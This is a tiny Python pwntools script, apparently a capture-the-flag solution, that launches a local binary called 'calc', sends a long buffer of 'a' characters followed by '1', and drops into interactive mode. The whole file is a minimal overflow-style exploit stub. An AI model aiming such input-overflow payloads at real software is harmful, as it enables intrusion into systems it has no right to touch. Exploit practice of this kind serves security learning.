from pwn import*
p = process('./calc')

pay =''
pay += 'a'*0x3ff
pay += '1'
p.sendline(pay)

p.interactive()
